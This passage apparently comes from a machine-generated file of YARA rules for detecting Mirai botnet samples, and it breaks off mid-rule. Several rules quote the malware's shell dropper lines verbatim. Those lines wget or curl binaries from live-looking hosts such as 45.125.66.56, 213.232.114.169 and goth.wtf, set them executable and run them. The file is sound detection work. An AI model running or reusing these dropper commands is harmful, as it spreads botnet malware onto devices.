   meta:
      description = "dropzone - file Mirai(signature)_8ac733a1.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "8ac733a14bdcdf3b2543a8e420d2fa224bc067e425ac38ea9d99fbe389f48c44"
   strings:
      $s1 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s2 = "cvkqpav" fullword ascii /* score: '8.00'*/
      $s3 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s4 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s5 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s6 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s7 = "nqejpagl" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__9c08e023 {
   meta:
      description = "dropzone - file Mirai(signature)_9c08e023.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "9c08e0232337e3288d21e5f278f98d2a7d514763b85aa5d79c3588e81037ec5d"
   strings:
      $s1 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s2 = "cvkqpav" fullword ascii /* score: '8.00'*/
      $s3 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s4 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s5 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s6 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s7 = "nqejpagl" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__c58e808c {
   meta:
      description = "dropzone - file Mirai(signature)_c58e808c.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "c58e808c625254e64aca91b40fab4133f5c54657e68857f2a3bc6a35f468ad26"
   strings:
      $s1 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s2 = "cvkqpav" fullword ascii /* score: '8.00'*/
      $s3 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s4 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s5 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s6 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s7 = "nqejpagl" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__fa94633b {
   meta:
      description = "dropzone - file Mirai(signature)_fa94633b.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "fa94633bd1d61a6bfaad5d6308f4020013ccc11c9c9fa463e9795485b84ddaf5"
   strings:
      $s1 = "N^NuPOST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s3 = "cvkqpav" fullword ascii /* score: '8.00'*/
      $s4 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s5 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s6 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s7 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s8 = "nqejpagl" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__2ef19b86 {
   meta:
      description = "dropzone - file Mirai(signature)_2ef19b86.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "2ef19b863a897ed20f534f434e4cafd6198d218d3b77f88b03bf4767de08635b"
   strings:
      $s1 = "fake_time" fullword ascii /* score: '9.00'*/
      $s2 = "huawei_fake_time" fullword ascii /* score: '9.00'*/
      $s3 = "thinkphp_fake_time" fullword ascii /* score: '9.00'*/
      $s4 = "zyxelscanner_setup_connection" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__f381a2d3 {
   meta:
      description = "dropzone - file Mirai(signature)_f381a2d3.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "f381a2d342fe76f7dbe8cf69ca3f3a886ea91605fc5ae2d5542e20f6091a7fc9"
   strings:
      $s1 = "u__get_myaddress: socket" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__025e4a8a {
   meta:
      description = "dropzone - file Mirai(signature)_025e4a8a.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "025e4a8a825ef9dcc17db9c4b11f88162aba9309480d53f5996bc40b5dd36ea5"
   strings:
      $s1 = "rm -rf arm7;/bin/busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 jaws;" fullword ascii /* score: '27.00'*/
      $s2 = "rm -rf ppc;/bin/busybox wget http://45.125.66.56/ppc; chmod 777 ppc; ./ppc jaws;" fullword ascii /* score: '27.00'*/
      $s3 = "rm -rf arm5;/bin/busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 jaws;" fullword ascii /* score: '27.00'*/
      $s4 = "rm -rf sh4;/bin/busybox wget http://45.125.66.56/sh4; chmod 777 sh4; ./sh4 jaws;" fullword ascii /* score: '27.00'*/
      $s5 = "rm -rf spc;/bin/busybox wget http://45.125.66.56/spc; chmod 777 spc; ./spc jaws;" fullword ascii /* score: '27.00'*/
      $s6 = "rm -rf mips;/bin/busybox wget http://45.125.66.56/mips; chmod 777 mips; ./mips jaws;" fullword ascii /* score: '27.00'*/
      $s7 = "rm -rf x86_64;/bin/busybox wget http://45.125.66.56/x86_64; chmod 777 x86_64; ./x86_64 jaws;" fullword ascii /* score: '27.00'*/
      $s8 = "rm -rf arm6;/bin/busybox wget http://45.125.66.56/arm6; chmod 777 arm6; ./arm6 jaws;" fullword ascii /* score: '27.00'*/
      $s9 = "rm -rf mpsl;/bin/busybox wget http://45.125.66.56/mpsl; chmod 777 mpsl; ./mpsl jaws;" fullword ascii /* score: '27.00'*/
      $s10 = "rm -rf x86;/bin/busybox wget http://45.125.66.56/x86; chmod 777 x86; ./x86 jaws;" fullword ascii /* score: '27.00'*/
      $s11 = "rm -rf arm;/bin/busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm jaws;" fullword ascii /* score: '27.00'*/
      $s12 = "rm -rf arm7;wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 jaws;" fullword ascii /* score: '24.00'*/
      $s13 = "rm -rf mips;wget http://45.125.66.56/mips; chmod 777 mips; ./mips jaws;" fullword ascii /* score: '24.00'*/
      $s14 = "rm -rf spc;wget http://45.125.66.56/spc; chmod 777 spc; ./spc jaws;" fullword ascii /* score: '24.00'*/
      $s15 = "rm -rf sh4;wget http://45.125.66.56/sh4; chmod 777 sh4; ./sh4 jaws;" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__1c7dc1e3 {
   meta:
      description = "dropzone - file Mirai(signature)_1c7dc1e3.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1c7dc1e3e0dc77326989815580580b8e6b4ceb36d1bf7a2e6c0838dcd2514db5"
   strings:
      $s1 = "rm -rf arm5;/bin/busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 multi;" fullword ascii /* score: '27.00'*/
      $s2 = "rm -rf mips;/bin/busybox wget http://45.125.66.56/mips; chmod 777 mips; ./mips multi;" fullword ascii /* score: '27.00'*/
      $s3 = "rm -rf spc;/bin/busybox wget http://45.125.66.56/spc; chmod 777 spc; ./spc multi;" fullword ascii /* score: '27.00'*/
      $s4 = "rm -rf arm7;/bin/busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 multi;" fullword ascii /* score: '27.00'*/
      $s5 = "rm -rf mpsl;/bin/busybox wget http://45.125.66.56/mpsl; chmod 777 mpsl; ./mpsl multi;" fullword ascii /* score: '27.00'*/
      $s6 = "rm -rf sh4;/bin/busybox wget http://45.125.66.56/sh4; chmod 777 sh4; ./sh4 multi;" fullword ascii /* score: '27.00'*/
      $s7 = "rm -rf arm;/bin/busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm multi;" fullword ascii /* score: '27.00'*/
      $s8 = "rm -rf ppc;/bin/busybox wget http://45.125.66.56/ppc; chmod 777 ppc; ./ppc multi;" fullword ascii /* score: '27.00'*/
      $s9 = "rm -rf arm6;/bin/busybox wget http://45.125.66.56/arm6; chmod 777 arm6; ./arm6 multi;" fullword ascii /* score: '27.00'*/
      $s10 = "rm -rf x86_64;/bin/busybox wget http://45.125.66.56/x86_64; chmod 777 x86_64; ./x86_64 multi;" fullword ascii /* score: '27.00'*/
      $s11 = "rm -rf x86;/bin/busybox wget http://45.125.66.56/x86; chmod 777 x86; ./x86 multi;" fullword ascii /* score: '27.00'*/
      $s12 = "rm -rf ppc;wget http://45.125.66.56/ppc; chmod 777 ppc; ./ppc multi;" fullword ascii /* score: '24.00'*/
      $s13 = "rm -rf x86_64;wget http://45.125.66.56/x86_64; chmod 777 x86_64; ./x86_64 multi;" fullword ascii /* score: '24.00'*/
      $s14 = "rm -rf spc;wget http://45.125.66.56/spc; chmod 777 spc; ./spc multi;" fullword ascii /* score: '24.00'*/
      $s15 = "rm -rf arm;wget http://45.125.66.56/arm; chmod 777 arm; ./arm multi;" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__516e2a9d {
   meta:
      description = "dropzone - file Mirai(signature)_516e2a9d.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "516e2a9db6f0dacb302c56467fe0ff3d1048d8d17d469e203dbf7373a2486ed9"
   strings:
      $s1 = "rm -rf mips;/bin/busybox wget http://45.125.66.56/mips; chmod 777 mips; ./mips ipc;" fullword ascii /* score: '27.00'*/
      $s2 = "rm -rf sh4;/bin/busybox wget http://45.125.66.56/sh4; chmod 777 sh4; ./sh4 ipc;" fullword ascii /* score: '27.00'*/
      $s3 = "rm -rf arm7;/bin/busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 ipc;" fullword ascii /* score: '27.00'*/
      $s4 = "rm -rf x86_64;/bin/busybox wget http://45.125.66.56/x86_64; chmod 777 x86_64; ./x86_64 ipc;" fullword ascii /* score: '27.00'*/
      $s5 = "rm -rf x86;/bin/busybox wget http://45.125.66.56/x86; chmod 777 x86; ./x86 ipc;" fullword ascii /* score: '27.00'*/
      $s6 = "rm -rf mpsl;/bin/busybox wget http://45.125.66.56/mpsl; chmod 777 mpsl; ./mpsl ipc;" fullword ascii /* score: '27.00'*/
      $s7 = "rm -rf ppc;/bin/busybox wget http://45.125.66.56/ppc; chmod 777 ppc; ./ppc ipc;" fullword ascii /* score: '27.00'*/
      $s8 = "rm -rf arm5;/bin/busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 ipc;" fullword ascii /* score: '27.00'*/
      $s9 = "rm -rf arm;/bin/busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm ipc;" fullword ascii /* score: '27.00'*/
      $s10 = "rm -rf spc;/bin/busybox wget http://45.125.66.56/spc; chmod 777 spc; ./spc ipc;" fullword ascii /* score: '27.00'*/
      $s11 = "rm -rf arm6;/bin/busybox wget http://45.125.66.56/arm6; chmod 777 arm6; ./arm6 ipc;" fullword ascii /* score: '27.00'*/
      $s12 = "rm -rf arm5;wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 ipc;" fullword ascii /* score: '24.00'*/
      $s13 = "rm -rf arm7;wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 ipc;" fullword ascii /* score: '24.00'*/
      $s14 = "rm -rf x86_64;wget http://45.125.66.56/x86_64; chmod 777 x86_64; ./x86_64 ipc;" fullword ascii /* score: '24.00'*/
      $s15 = "rm -rf ppc;wget http://45.125.66.56/ppc; chmod 777 ppc; ./ppc ipc;" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__03c0aa47 {
   meta:
      description = "dropzone - file Mirai(signature)_03c0aa47.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "03c0aa479424e0fa6ba4f83a32dc4c945cdb2610ff4ab606563b98592ecbf220"
   strings:
      $s1 = "[ATTACKS] Launching flood function." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__6733cd6a {
   meta:
      description = "dropzone - file Mirai(signature)_6733cd6a.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "6733cd6a8cf7338a6835beadd1f393d4916bec7f8615cbb74f3d4e7f649f6f77"
   strings:
      $s1 = "[ATTACKS] Launching flood function." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__a4366f9e {
   meta:
      description = "dropzone - file Mirai(signature)_a4366f9e.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "a4366f9e2c99fd643f066af7245d3a3dd867d8dac74699e9637ed50eb584f762"
   strings:
      $s1 = "[ATTACKS] Launching flood function." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__b5b805f0 {
   meta:
      description = "dropzone - file Mirai(signature)_b5b805f0.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b5b805f0100b455afec35b83534ffdabb602efe869c9bba0434a255487c42e2d"
   strings:
      $s1 = "[ATTACKS] Launching flood function." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__ca1dbf24 {
   meta:
      description = "dropzone - file Mirai(signature)_ca1dbf24.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ca1dbf2404696a03d2c90fc4531a171eec2e0c3b95a435f29f1ac492f327fce4"
   strings:
      $s1 = "[ATTACKS] Launching flood function." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__047962de {
   meta:
      description = "dropzone - file Mirai(signature)_047962de.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "047962de07f159f5044611e8f9e84ce26c2cdbf014ce9ee5392debd4f791c745"
   strings:
      $s1 = "found exec" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__0b7c16cf {
   meta:
      description = "dropzone - file Mirai(signature)_0b7c16cf.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "0b7c16cfedadb388645586be2d6e675ef32bae7653f71820eaf8079544e7c12b"
   strings:
      $s1 = "found exec" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__7febab08 {
   meta:
      description = "dropzone - file Mirai(signature)_7febab08.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "7febab08eb97129c9190e803dd8450460e5887c5ee9a5b03687e64a6a7256ed8"
   strings:
      $s1 = "found exec" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__ba87c9af {
   meta:
      description = "dropzone - file Mirai(signature)_ba87c9af.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ba87c9af69fbbebf29dcc1f0669e333fa20c9634be4ed51aa9b38148eca149ab"
   strings:
      $s1 = "found exec" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__d3334897 {
   meta:
      description = "dropzone - file Mirai(signature)_d3334897.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "d33348979e8b1cb05e78e5d577d461dbf7c0343bb66d7ba5b032434c90d970e2"
   strings:
      $s1 = "found exec" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__085ef2d3 {
   meta:
      description = "dropzone - file Mirai(signature)_085ef2d3.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "085ef2d3904f13f9cdd3e950793ba5df92e62cb2ae9741596cc336948228f415"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for MIPS" fullword ascii /* score: '17.50'*/
      $s2 = "Unable to process RELA relocs" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__1e43050b {
   meta:
      description = "dropzone - file Mirai(signature)_1e43050b.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1e43050b691b5f5815aedbeca55d24fcecfe78aba4a30d93d33e7509d7e0f999"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for MIPS" fullword ascii /* score: '17.50'*/
      $s2 = "Unable to process RELA relocs" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__40f3f130 {
   meta:
      description = "dropzone - file Mirai(signature)_40f3f130.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "40f3f1306303e637207a2d67b40a3c99b3176264fad39fbf3c67d9b4f4d9ff7f"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for ARM" fullword ascii /* score: '17.50'*/
      $s2 = "R_ARM_PC24: Compile shared libraries with -fPIC!" fullword ascii /* score: '16.00'*/
      $s3 = "Unable to process RELA relocs" fullword ascii /* score: '15.00'*/
      $s4 = "qs)!!!!" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__5080bf43 {
   meta:
      description = "dropzone - file Mirai(signature)_5080bf43.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "5080bf43f85d8a58d10b69c2fe32051b2db856875e05ba7a9904fc51f1d664e7"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for ARM" fullword ascii /* score: '17.50'*/
      $s2 = "R_ARM_PC24: Compile shared libraries with -fPIC!" fullword ascii /* score: '16.00'*/
      $s3 = "Unable to process RELA relocs" fullword ascii /* score: '15.00'*/
      $s4 = "qs)!!!!" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__7dc56ae9 {
   meta:
      description = "dropzone - file Mirai(signature)_7dc56ae9.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "7dc56ae9788f6b78d3a87d2c7f35a90c5ea146fec5f75c521c6f9a6ff1df417c"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for MIPS" fullword ascii /* score: '17.50'*/
      $s2 = "Unable to process RELA relocs" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__8dd7c876 {
   meta:
      description = "dropzone - file Mirai(signature)_8dd7c876.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "8dd7c876c8bf27258fde6453156c261b0ba61738385cb6c1ed8030708b6d4556"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for MIPS" fullword ascii /* score: '17.50'*/
      $s2 = "Unable to process RELA relocs" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__1777cf79 {
   meta:
      description = "dropzone - file Mirai(signature)_1777cf79.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1777cf7935d3c66a436d87edccfd3272c1abf6651c7f60a483dba9a26591c4c1"
   strings:
      $s1 = "bsbinhom" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      all of them
}

rule Mirai_signature__10c1e889 {
   meta:
      description = "dropzone - file Mirai(signature)_10c1e889.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "10c1e8894c8dc7a748c51fe6708d3999bf13c022e4e6406b4a2d73d8caebe5b3"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.ppc; curl -O http://213.232.114.169/d/" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.ppc; curl -O http://213.232.114.169/d/" ascii /* score: '29.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.sh4; curl -O http://213.232.114.169/d/" ascii /* score: '27.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.arm7; curl -O http://213.232.114.169/d" ascii /* score: '27.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.arm6; curl -O http://213.232.114.169/d" ascii /* score: '27.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.arm4; curl -O http://213.232.114.169/d" ascii /* score: '27.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.x86; curl -O http://213.232.114.169/d/" ascii /* score: '27.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.arm5; curl -O http://213.232.114.169/d" ascii /* score: '27.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.mpsl; curl -O http://213.232.114.169/d" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.mips; curl -O http://213.232.114.169/d" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.m68k; curl -O http://213.232.114.169/d" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.arm6; curl -O http://213.232.114.169/d" ascii /* score: '26.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.arm7; curl -O http://213.232.114.169/d" ascii /* score: '26.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.arm5; curl -O http://213.232.114.169/d" ascii /* score: '26.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.169/d/xans.sh4; curl -O http://213.232.114.169/d/" ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 5KB and
      8 of them
}

rule Mirai_signature__12869a54 {
   meta:
      description = "dropzone - file Mirai(signature)_12869a54.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "12869a541587df29c4df8bc373b85a8e9b325ff8b68d5c1eb1dd031e660412f7"
   strings:
      $s1 = "e<WjNr:\"" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__1594e168 {
   meta:
      description = "dropzone - file Mirai(signature)_1594e168.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1594e168ac727fda4f00f1f82548c69c4b92041a885406f480b3cc3f799ab321"
   strings:
      $s1 = "curl http://goth.wtf/mips; chmod 777 mips; ./mips android" fullword ascii /* score: '13.00'*/
      $s2 = "curl http://goth.wtf/x86_64; chmod 777 x86_64; ./x86_64 android" fullword ascii /* score: '13.00'*/
      $s3 = "curl http://goth.wtf/arm6; chmod 777 arm6; ./arm6 android" fullword ascii /* score: '13.00'*/
      $s4 = "curl http://goth.wtf/arm5; chmod 777 arm5; ./arm5 android" fullword ascii /* score: '13.00'*/
      $s5 = "curl http://goth.wtf/mpsl; chmod 777 mpsl; ./mpsl android" fullword ascii /* score: '13.00'*/
      $s6 = "curl http://goth.wtf/arm7; chmod 777 arm7; ./arm7 android" fullword ascii /* score: '13.00'*/
      $s7 = "curl http://goth.wtf/arm4; chmod 777 arm4; ./arm4 android" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x7563 and filesize < 1KB and
      all of them
}

rule Mirai_signature__990ed26a {
   meta:
      description = "dropzone - file Mirai(signature)_990ed26a.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "990ed26a639e6932e6c248f32945befc92d4e4a604d34c6ba7956b17779e8d12"
   strings:
      $s1 = "[0clKillerStat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "[0clKillerMaps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "[0clKillerKillerEXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s4 = "softbot.arm" fullword ascii /* score: '10.00'*/
      $s5 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__27daad01 {
   meta:
      description = "dropzone - file Mirai(signature)_27daad01.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "27daad013d4b3e892c2b121d765ec841a0e151c5c4840370a27cbd87c885e672"
   strings:
      $s1 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__2d3c7618 {
   meta:
      description = "dropzone - file Mirai(signature)_2d3c7618.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "2d3c7618a3966965e96f0ef730ca93e671a2e6d9868454ffb5e1aeb0d48296db"
   strings:
      $s1 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__3c52ae72 {
   meta:
      description = "dropzone - file Mirai(signature)_3c52ae72.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "3c52ae721b661c4ecf233d26650e5695f8afac6b73db8d8685791ba20bc87bcf"
   strings:
      $s1 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__77c5aae0 {
   meta:
      description = "dropzone - file Mirai(signature)_77c5aae0.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "77c5aae02cfddb102ae665c99d194bf3a94ab91f628f593230b82bd8f47b4c99"
   strings:
      $s1 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__7d42e11b {
   meta:
      description = "dropzone - file Mirai(signature)_7d42e11b.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "7d42e11b01dd8da4141c7013da3026366a773e81f8e37ae4b95845af1ee1dbbd"
   strings:
      $s1 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__8f299f0d {
   meta:
      description = "dropzone - file Mirai(signature)_8f299f0d.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "8f299f0d8fbafe241ab6adddfdad4777f33854bdbc5108dcd45c2c0bbef48d51"
   strings:
      $s1 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__b96c86ef {
   meta:
      description = "dropzone - file Mirai(signature)_b96c86ef.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b96c86ef1057934f3483d7d21c4ca34761f63f33441a23299aaa2d4a730aeaad"
   strings:
